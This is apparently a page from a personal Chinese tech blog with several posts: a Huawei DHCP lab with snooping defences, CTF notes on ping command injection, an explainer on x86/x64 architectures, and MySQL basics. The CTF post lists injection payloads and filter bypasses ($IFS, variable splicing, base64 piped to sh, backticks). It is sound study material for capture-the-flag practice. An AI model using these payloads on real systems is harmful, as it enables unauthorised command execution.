+<p>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dhcp server excluded-ip-address 192.168.1.2 192.1<br>68.1.254<br>设置预留地址（这里不知道啥意思）<br>Warning:Some of addresses not be excluded are not idle,or not in the pool.<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dhcp server excluded-ip-address 192.168.1.2<br>Error:Only idle or expired IP address can be disabled.<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]dis th<br>[V200R003C00]<br>#<br>interface GigabitEthernet0&#x2F;0&#x2F;0.1<br> dot1q termination vid 10<br> ip address 192.168.1.1 255.255.255.0<br> arp broadcast enable<br> dhcp select interface<br> dhcp server excluded-ip-address 192.168.1.2 192.168.1.253<br> dhcp server dns-list 61.139.2.69<br>#<br>return<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.1]</p>
+<p>查看一下，设置pc1为DHCP，命令行输入ipconfig：<br>PC&gt;ipconfig</p>
+<p>Link local IPv6 address………..: fe80::5689:98ff:fee3:6d23<br>IPv6 address………………….: :: &#x2F; 128<br>IPv6 gateway………………….: ::<br>IPv4 address………………….: 192.168.1.254        （获取到了ip）<br>Subnet mask…………………..: 255.255.255.0<br>Gateway………………………: 192.168.1.1              （网关地址，路由器AR1的地址）<br>Physical address………………: 54-89-98-E3-6D-23<br>DNS server……………………:</p>
+<h2 id="PC2网段采用第二种方式实现DHCP功能："><a href="#PC2网段采用第二种方式实现DHCP功能：" class="headerlink" title="PC2网段采用第二种方式实现DHCP功能："></a>PC2网段采用第二种方式实现DHCP功能：</h2><p>地址池的方式获取ip地址<br>[Huawei]ip pool vlan20<br>Info: It’s successful to create an IP address pool.<br>[Huawei-ip-pool-vlan20]network 192.168.2.0 mask 24</p>
+<p>[Huawei-ip-pool-vlan20]excluded-ip-address 192.168.2.2<br>[Huawei-ip-pool-vlan20]excluded-ip-address 192.168.2.254<br>预留了两个地址<br>[Huawei-ip-pool-vlan20]gateway-list 192.168.2.1<br>配置网关<br>第一个模式是在接口下面配置的，会自动把接口的地址设置为网关地址<br>目前我们在系统视图里面，创建地址池，基于地址池，它不知道给谁应用，所以需要申明网关<br>[Huawei-ip-pool-vlan20]dns-list 2.2.2.2<br>[Huawei-ip-pool-vlan20]lease day 1<br>[Huawei-ip-pool-vlan20]q<br>[Huawei]int g0&#x2F;0&#x2F;0.2<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.2]dhcp select global<br>退出，在接口2下去引用刚刚的这个地址池<br>写了global后，会自动的去地址池里面寻找网段</p>
+<p>查看pc2：<br>PC&gt;ipconfig</p>
+<p>Link local IPv6 address………..: fe80::5689:98ff:fe38:5a85<br>IPv6 address………………….: :: &#x2F; 128<br>IPv6 gateway………………….: ::<br>IPv4 address………………….: 192.168.2.253<br>Subnet mask…………………..: 255.255.255.0<br>Gateway………………………: 192.168.2.1<br>Physical address………………: 54-89-98-38-5A-85<br>DNS server……………………: 2.2.2.2</p>
+<h2 id="PC3采用第三中中继方式获取IP地址："><a href="#PC3采用第三中中继方式获取IP地址：" class="headerlink" title="PC3采用第三中中继方式获取IP地址："></a>PC3采用第三中中继方式获取IP地址：</h2><p>路由器另一个接口连接”云”，云桥接vmnet 1<br>VMware虚拟机开启 windows server 2016服务器，网卡为vmnet1<br>服务器配置：<br>安装DHCP<br>配置到dhcp地址池 网段范围为 :192.168.4.0&#x2F;24</p>
+<p>增加PC3 连接至交换机的e0&#x2F;0&#x2F;4口，并将该接口加入vlan30<br>另外需要在交换机上行口允许vlan30流量通过<br>[Huawei]vlan 30<br>[Huawei-vlan30]int e0&#x2F;0&#x2F;4<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port link-type access 	<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]port default vlan 30</p>
+<p>[Huawei-Ethernet0&#x2F;0&#x2F;4]int e0&#x2F;0&#x2F;3	<br>[Huawei-Ethernet0&#x2F;0&#x2F;3]port trunk allow-pass vlan 30</p>
+<p>路由器配置：<br>[Huawei]int g0&#x2F;0&#x2F;0.3<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]dot1q termination vid 30<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]ip add 192.168.4.254 255.255.255.0<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]arp broadcast enable<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]dhcp select relay<br>[Huawei-GigabitEthernet0&#x2F;0&#x2F;0.3]dhcp relay server-ip 192.168.3.1</p>
+<h2 id="DHCP面临的安全威胁："><a href="#DHCP面临的安全威胁：" class="headerlink" title="DHCP面临的安全威胁："></a>DHCP面临的安全威胁：</h2><p>​	网络攻击行为无处不在，针对DHCP的攻击行为也不例外。例如，某公司突然出现了大面积用户无法上网的情况，经检查用户终端均未获取到IP地址，且DHCP Server地址池中的地址已经全部被分配出去了，这种情况很有可能就是DHCP受到了饿死攻击而导致的。<br>​	DHCP在设计上未充分考虑到安全因素，从而留下了许多安全漏洞，使得DHCP很容易受到攻击。实际网络中，针对DHCP的攻击行为主要有以下三种：<br>1、DHCP饿死攻击<br>2、仿冒DHCP Server攻击<br>3、DHCP中间人攻击</p>
+<h3 id="DHCP饿死攻击"><a href="#DHCP饿死攻击" class="headerlink" title="DHCP饿死攻击"></a>DHCP饿死攻击</h3><p>攻击原理：攻击者持续大量地向DHCP Server申请IP地址，直到耗尽DHCP Server地址池中的IP地址，导致DHCP Server不能给正常的用户进行分配。<br>漏洞分析：DHCP Server向申请者分配IP地址时，无法区分正常的申请者与恶意的申请者。</p>
+<h3 id="DHCP中间人攻击"><a href="#DHCP中间人攻击" class="headerlink" title="DHCP中间人攻击"></a>DHCP中间人攻击</h3><p>攻击原理：攻击者利用ARP机制，让PC-A学习到IP-S与MAC-B的映射关系，又让Server学习到IP-A与MAC-B的映射关系。如此一来，PC-A与Server之间交互的IP报文都会经过攻击者中转。<br>漏洞分析：从本质上讲，中间人攻击是一种Spoofing IP&#x2F;MAC攻击，中间人利用了虚假的IP地址与MAC地址之间的映射关系来同时欺骗DHCP的客户端和服务器。</p>
+<h3 id="仿冒DHCP-Server攻击"><a href="#仿冒DHCP-Server攻击" class="headerlink" title="仿冒DHCP Server攻击"></a>仿冒DHCP Server攻击</h3><p>攻击原理：攻击者仿冒DHCP Server，向客户端分配错误的IP地址及提供错误的网关地址等参数，导致客户端无法正常访问网络。<br>漏洞分析：DHCP客户端接收到来自DHCP Server的DHCP消息后，无法区分这些DHCP消息是来自仿冒的DHCP Server，还是来自合法的DHCP Server。</p>
+<h2 id="DHCP-Snooping技术："><a href="#DHCP-Snooping技术：" class="headerlink" title="DHCP Snooping技术："></a>DHCP Snooping技术：</h2><p>为了增强网络安全，防止DHCP受到攻击，一种称为DHCP Snooping的技术应运而生。DHCP Snooping不是一种标准技术，尚未有统一的标准规范，不同的网络设备制造商在DHCP Snooping的实现上也不尽相同。<br>DHCP Snooping部署在交换机上，其作用类似于在DHCP客户端与DHCP服务器端之间构筑了一道虚拟的防火墙</p>
+<p>打开DHCP snooping功能：<br>[Huawei]dhcp enable<br>[Huawei]dhcp snooping enable<br>防御饿死攻击：<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]dhcp snooping check dhcp-chaddr enable<br>防御仿冒攻击：<br>[Huawei-Ethernet0&#x2F;0&#x2F;1]dhcp snooping trusted<br>[Huawei-Ethernet0&#x2F;0&#x2F;4]undo dhcp snooping trusted 		&#x2F;&#x2F;设置非信任接口<br>防止中间人攻击：<br>[Huawei]arp dhcp-snooping-detect enable </p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-CTF-ping"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/CTF-ping/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.160Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="CTF——ping相关"><a href="#CTF——ping相关" class="headerlink" title="CTF——ping相关"></a>CTF——ping相关</h1><p><strong>Ping</strong><br>PING （Packet Internet Groper），因特网包探索器，用于测试网络连接量的程序 。<br>Ping是工作在 TCP&#x2F;IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特网报文控制协议）Echo 请求报文，测试目的站是否可达及了解其有关状态  。</p>
+<p><strong>检测是否可以注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;whoami</span><br><span class="line">如果存在注入，得到的结果是“www-data”</span><br></pre></td></tr></table></figure>
+
+<p><strong>ping 题目常过滤字符</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">‘$’								</span><br><span class="line">‘;’</span><br><span class="line">‘|’</span><br><span class="line">‘-’</span><br><span class="line">‘(’</span><br><span class="line">‘)’</span><br><span class="line">‘反引号’</span><br><span class="line">‘||’</span><br><span class="line">‘&amp;&amp;’</span><br><span class="line">‘&amp;’</span><br><span class="line">‘&#125;’</span><br><span class="line">‘&#123;’</span><br></pre></td></tr></table></figure>
+
+<p><strong>解决过滤</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;a=&quot;l&quot;;b=&quot;s&quot;;c=$a$b;$c(后面的部分可能会用引号包裹）</span><br></pre></td></tr></table></figure>
+
+<p><strong>针对空格过滤，可以使用：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line">&lt; </span><br><span class="line">$IFS</span><br><span class="line">$IFS$9</span><br></pre></td></tr></table></figure>
+
+<p><strong>几种解题思路</strong></p>
+<h2 id="1、通过变量实现字符串拼接"><a href="#1、通过变量实现字符串拼接" class="headerlink" title="1、通过变量实现字符串拼接"></a>1、通过变量实现字符串拼接</h2><p>构造&#x2F;?ip&#x3D;127.0.0. 1;b&#x3D;ag;a&#x3D;fl;cat$lFS$1$a$b.php<br>注： 此处将变量ab的位置互换是为了绕过字符串匹配</p>
+<h2 id="2-通过执行sh命令来执行"><a href="#2-通过执行sh命令来执行" class="headerlink" title="2.通过执行sh命令来执行"></a>2.通过执行sh命令来执行</h2><p>(bash被过滤了，不然也可以执行)<br>构造&#x2F;?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw| base64$IFS$1-d|sh<br>注：sh是linux中运行shell的命令， bash相当于sh的升级版，shebash</p>
+<p>使用 base64 编码的方式来绕过 flag 过滤。</p>
+<p>加密命令<br>echo “cat flag.php” | base64<br>解密命令并执行<br>echo Y2F0IGZsYWcucGhwCg&#x3D;&#x3D; | base64 -d | sh</p>
+<h2 id="3-内联执行"><a href="#3-内联执行" class="headerlink" title="3.内联执行"></a>3.内联执行</h2><p>构造&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9’ls<br>注：内联， 就是将反引号内命令的输出作为输入执行。</p>
+<p>内联函数：将指定的函数体插入并取代每一处调用该函数的地方。</p>
+<p>反引号在linux中作为内联执行，执行输出结果。也就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">//执行ls输出 index.php 和 flag.php 。然后再执行 cat flag.php;cat index.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造payload &#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9<code>ls</code></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-×64×86"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/%C3%9764%C3%9786/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.157Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="什么是x86，x64？"><a href="#什么是x86，x64？" class="headerlink" title="什么是x86，x64？"></a><strong>什么是x86，x64？</strong></h1><p><strong>x86、x64</strong> 都指的是 <code>CPU</code> 的 <strong>指令集架构</strong></p>
+<h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a><strong>指令集</strong></h2><h3 id="指令集定义："><a href="#指令集定义：" class="headerlink" title="指令集定义："></a><strong>指令集定义：</strong></h3><p>​	所谓<strong>指令集</strong>，可以理解成<u>硬件对外的接口</u>。我们运行程序是通过操作系统调度，操作系统然后让硬件去计算。</p>
+<p>​	让硬件计算的话，比如一些<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%8A%A0%E6%B3%95%E4%B9%98%E6%B3%95&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">加法乘法</a>，循环之类的，就需要硬件提供的接口，也就是指令集。这个就是我们常说的<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%9C%BA%E5%99%A8%E8%AF%AD%E8%A8%80&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">机器语言</a>，已经到了计算机的最底层了。</p>
+<h3 id="指令集架构主要分两大类："><a href="#指令集架构主要分两大类：" class="headerlink" title="指令集架构主要分两大类："></a><strong>指令集架构主要分两大类：</strong></h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%A4%8D%E6%9D%82%E6%8C%87%E4%BB%A4%E9%9B%86%E8%BF%90%E7%AE%97&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">复杂指令集运算</a>（Complex Instruction Set Computing，CISC）<br>简单的理解就是提供的指令很多，也都很复杂。<br>以 <code>intel</code> 的 <code>x86</code> 架构为代表，主要针对的操作系统是<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%BE%AE%E8%BD%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">微软</a>的 <code>Windows</code> 和<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%8B%B9%E6%9E%9C&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">苹果</a>的 <code>maxOS</code>。另外 <code>Linux</code>，一些 <code>UNIX</code> 等，都可以运行在复杂指令集架构的微处理器。</li>
+<li><a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E7%B2%BE%E7%AE%80%E6%8C%87%E4%BB%A4%E9%9B%86%E8%BF%90%E7%AE%97&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">精简指令集运算</a>（Reduced Instruction Set Computing，RISC）<br>简单的理解就是提供的指令很少，也都比较简单，只是一些基础的指令。<br>以 <code>ARM</code> 公司的 <code>arm</code> 架构为代表。当前有 <code>UNIX</code>、<code>Linux</code> 以及包括 <code>iOS</code>、<code>Android</code>、<code>Windows Phone</code> 等在内的大多数<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E7%A7%BB%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">移动操作系统</a>运行在精简指令集的处理器上。</li>
+</ul>
+<p>​	复杂指令集和精简指令集比较的话，区别在于我们编程（直接写机器语言代码在 <code>CPU</code>上运行）的时候，比如实现乘法。根据提供的指令，复杂指令集可能一条命令就够了，而简单指令集我们可能需要加法、循环等多条指令。</p>
+<p>​	硬件和软件也就是互补的过程，当硬件提供功能简单了，写软件就复杂些。当硬件提供的功能多了，写软件就简单些。</p>
+<h2 id="x86-架构发展"><a href="#x86-架构发展" class="headerlink" title="x86 架构发展"></a><strong>x86 架构发展</strong></h2><p><strong>x86</strong> 架构于 <code>1978</code> 年推出的 <code>Intel 8086</code> 中央处理器中首度出现，<code>8086</code> 在三年后为 <code>IBM PC</code> 所选用，之后 <code>x86</code> 便成为了<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E4%B8%AA%E4%BA%BA%E7%94%B5%E8%84%91&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">个人电脑</a>的标准平台，成为了历来最成功的 <code>CPU</code> 架构。<code>8086</code> 是 <code>16</code> 位处理器，接着一系列的处理器进行了 <code>32</code> 位架构的改进，现在 <strong>x86 一般指 32 位的架构</strong>。</p>
+<p>该系列较早期的处理器名称是以<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%95%B0%E5%AD%97&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">数字</a>来表示 <code>80x86</code>。由于以 <code>86</code> 作为结尾，包括 <code>Intel 8086</code>、<code>80186</code>、<code>80286</code>、<code>80386</code> 以及 <code>80486</code>，因此其架构被称为 <code>x86</code>。</p>
+<p>生产 <code>x86</code> 架构的 <code>CPU</code> 除了<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%9B%A0%E7%89%B9%E5%B0%94&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">因特尔</a>，它还把<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E4%B8%93%E5%88%A9%E6%8E%88%E6%9D%83&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">专利授权</a>给了现在比较出名的<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%B6%85%E5%BE%AE&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">超微</a>（<strong>AMD</strong>）。然后在 <code>1999</code> 年 <code>AMD</code> 首次公开 <code>64</code> 位集以扩展 <code>x86</code>，此架构称为 <code>AMD64</code>。后来英特尔也推出了与之兼容的处理器，并命名<code>Intel 64</code>。两者一般被统称为 <code>x86-64</code> 或 <code>x64</code>，开创了 <code>x86</code> 的 <code>64</code> 位时代。</p>
+<p>这里会有一个疑问 ，<code>Intel</code> 去哪里了，为什么没有率先做 <code>64</code> 位的？其实 <code>intel</code> 做了，为了不让其他厂商模仿，申请了很多专利，与<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%83%A0%E6%99%AE&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">惠普</a>联合设计了全新的架构 <code>IA-64</code> ，但最大的问题就是它与之前的 <code>x86</code> 不兼容，且市场反应较冷淡，然后就凉凉了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%8B%B9%E6%9E%9C%E5%85%AC%E5%8F%B8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">苹果公司</a>和 RPM 包管理员以 <code>x86-64</code> 或 <code>x86_64</code> 称呼此 <code>64</code> 位架构。<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E7%94%B2%E9%AA%A8%E6%96%87%E5%85%AC%E5%8F%B8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">甲骨文公司</a>及 <code>Microsoft</code> 称之为<code>x64</code>。<code>BSD</code> 家族及其他 <code>Linux</code> 发行版则使用 <code>amd64</code>，<code>32</code> 位版本则称为<code>i386</code>（或 <code>i486/586/686</code>），<code>Arch Linux</code> 用<code>x86_64</code> 称呼此 <code>64</code> 位架构。</p>
+<p>现在 x86 架构的CPU的话基本上就是 <code>Intel</code> 和 <code>AMD</code> 两家公司了。</p>
+<h2 id="arm-架构发展"><a href="#arm-架构发展" class="headerlink" title="arm 架构发展"></a><strong>arm 架构发展</strong></h2><p><code>arm</code> 架构的话就是 <code>ARM</code> 公司的，这家公司不生产<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%8A%AF%E7%89%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">芯片</a>，而是以授权的方式盈利。具体发展可以参考 <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/[https://dongka.github.io/2018/11/17/cpu/arm%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84%E7%9A%84%E5%8F%91%E5%B1%95/](https://dongka.github.io/2018/11/17/cpu/arm%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84%E7%9A%84%E5%8F%91%E5%B1%95/)">这里</a> 和 <a href="https://link.zhihu.com/?target=https://www.eefocus.com/mcu-dsp/409079/r0">这里</a> 。从诺基亚到<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E8%8B%B9%E6%9E%9C%E6%89%8B%E6%9C%BA&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">苹果手机</a>、<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">安卓手机</a>，奠定了其在<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%99%BA%E8%83%BD%E6%89%8B%E6%9C%BA&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">智能手机</a>市场的霸主地位。现在常见的<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E9%AB%98%E9%80%9A%E9%AA%81%E9%BE%99%E7%B3%BB%E5%88%97&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">高通骁龙系列</a>就是 <code>arm</code> 架构。</p>
+<h2 id="软件安装的版本"><a href="#软件安装的版本" class="headerlink" title="软件安装的版本"></a><strong>软件安装的版本</strong></h2><p>有时候在 <code>github</code> 上下载安装包的时候需要选择自己 <code>CPU</code> 的架构情况了。会提供不同<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1070349368%7D">操作系统</a>的三种架构， <code>x86</code> 的 <code>32</code> 位架构和 <code>64</code> 位架构，以及 <code>arm</code> 架构。</p>
+<p><code>linux</code> 中使用命令 <code>uname -a</code> 可以查看 <code>CPU</code> 的架构。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux DESKTOP-68NS8J3 <span class="number">3.4</span><span class="number">.0</span>+ #<span class="number">1</span> PREEMPT Thu Aug <span class="number">1</span> <span class="number">17</span>:<span class="number">06</span>:<span class="number">05</span> CST <span class="number">2013</span> x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>CPU 指令集架构目前主要是两大类。</p>
+<p><strong>复杂指令集</strong>是x86、x64(也叫 x86-64, amd64) 两种架构，专利在 <strong>Intel</strong> 和 <strong>AMD</strong> 两家公司手里， 该架构 CPU 主要是Intel 和 AMD 两家公司，这种 CPU <strong>常用在PC 机上</strong>，包括<code>Windows</code>，<code>macOS</code> 和 <code>Linux</code>。</p>
+<p><strong>简单指令集</strong>是 arm 一种架构，专利在<strong>ARM</strong>公司手里，该架构CPU 主要有高通、三星、苹果、华为海思、联发科等公司。这种 CPU <strong>常用在手机上</strong>，包括安卓和苹果。</p>
+<p><strong>X64指的是64位操作系统，X86指的是32位操作系统。</strong></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-post"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2024/04/27/post/"
+    >post</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/04/27/post/" class="article-date">
+  <time datetime="2024-04-26T16:05:28.000Z" itemprop="datePublished">2024-04-27</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+   
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-MySql"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2024/04/01/MySql/"
+    >MySql数据库</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/04/01/MySql/" class="article-date">
+  <time datetime="2024-04-01T15:25:56.473Z" itemprop="datePublished">2024-04-01</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h1><h2 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h2><p>1.win+r services.msc 找到mysql手动启动</p>
+<p>2.cmd net start mysql  启动     net stop mysql </p>
+<p>（启动失败就用管理员进入）</p>
+<h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2><p>1.MySql提供的客户端命令行工具</p>
+<p>找到MySQL 8.0 Command Line Client,输入密码即可连接</p>
+<p>2.cmd中执行指令</p>
+<p>mysql -u root -p</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-hello-world"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2024/03/05/hello-world/"
+    >Hello World</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/03/05/hello-world/" class="article-date">
+  <time datetime="2024-03-05T07:34:00.027Z" itemprop="datePublished">2024-03-05</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Hello/">Hello</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="这是Ymnnb的Blog"><a href="#这是Ymnnb的Blog" class="headerlink" title="这是Ymnnb的Blog"></a>这是Ymnnb的Blog</h2> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PS3/" rel="tag">PS3</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+  </article>
+  
+
+  
+  <nav class="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+  
+</section>
+</div>
+
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024
+        <i class="ri-heart-fill heart_icon"></i> Ymnnb
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
